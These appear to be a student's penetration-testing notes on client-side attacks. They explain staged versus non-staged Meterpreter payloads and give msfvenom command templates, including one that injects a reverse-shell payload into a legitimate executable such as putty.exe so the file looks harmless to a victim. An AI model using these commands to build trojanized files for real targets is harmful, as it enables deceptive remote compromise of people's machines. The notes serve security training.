Client Side Attacks
A client side attacks is an attack where the attacker tricks the victim into executing a malicious payload on their own system.
### Server-side attack
You attack the **server directly**

- SQL injection
- RCE
- File upload

---

### Client-side attack
 You attack the **user (victim machine)**
- Victim runs something
- YOU get access

### Server-side attack:
You break into a house directly

### Client-side attack:

You send a **fake parcel**  
 Person opens it  
 It contains a hidden device

### Staged and Non-staged Payload

A **non-staged payload** is sent **completely in one go**.

---
## 🧠 How it works

1. You send full payload
2. Victim runs it
3. You immediately get shell

---
## 🔥 Example thinking

👉 You send a **full package**
- Everything is inside already
- No downloading later

# 2. Staged Payload

## Definition

A **staged payload** is sent in **two parts**:

- Stage 1 = small initial payload (stager)
- Stage 2 = main payload (downloaded later)

### Staged payload

Uses: /
Example:
windows/meterpreter/reverse_tcp

### Non-staged payload

Uses: _

Example: 
windows/meterpreter_reverse_tcp

---

## 🧠 How it works

1. Send small payload (stager)
2. Victim runs it
3. It connects back to attacker
4. Downloads full payload
5. Executes it
## Lab Demonstration

msfvenom (this show help menu)
msfvenom --list payloads (to see the list of payloads)

## General structure

msfvenom -p <payload> LHOST=<your_ip> LPORT=<port> -f <format> -o <file>

-p is payload
LHOST attacker machine
LPORT Listening port 
-f file type you want
-o output



Injecting Payloads Into Windows Portable Executables

A Windows Portable Executable means a normal windows executable files 
.exe
.dll
.scr

Example:-
notepad.exe  
putty.exe  
calc.exe

Injecting Payload means
	We take a normal windows  .exe file and insert a malicious payload into it so that when the file runs our reverse shell or meterpreter also runs 

 Why do we do this?

Because a plain payload like:

payload.exe

looks suspicious.

But if the payload is injected into something like:

putty.exe

it may look more normal to a user.

This is a **client-side attack**, because we are not attacking an open service like SMB or FTP. We are depending on the victim to execute the file.


Basic msfvenom idea

General structure:

msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your-ip> LPORT=<port> -x normal.exe -f exe -o infected.exe

Meaning:

-p

Payload to use.

windows/meterpreter/reverse_tcp

Windows Meterpreter reverse connection.

LHOST

Your attacker/VPN IP.

LPORT

Port where you listen.

-x normal.exe

Use this normal `.exe` as the template.

-f exe

Output format is Windows executable.

-o infected.exe

Save final file as this name.